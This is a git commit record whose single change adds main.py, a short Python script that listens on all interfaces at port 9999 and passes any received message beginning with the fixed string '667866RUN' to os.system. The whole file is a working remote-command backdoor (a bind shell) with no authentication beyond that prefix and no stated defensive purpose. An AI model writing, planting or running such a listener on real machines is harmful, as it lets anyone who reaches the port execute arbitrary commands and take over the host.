b264c0f193a092a437fcc5358e9e9dabffa09bc6
senlinjun <yu2755221817@163.com>
2025-08-24 21:52:50 +0800

    first commit

---
+++ main.py
@@ -0,0 +1,14 @@
+import socket,os
+s = socket.socket()
+s.bind(('0.0.0.0', 9999))
+s.listen(5)
+while True:
+    c, addr = s.accept()
+    print('Got connection from', addr)
+    msg = c.recv(1024).decode("utf-8")
+    if msg.startswith("667866RUN"):
+        command = msg[9:]
+        print("Executing command:", command)
+        os.system(command)
+
+    c.close()
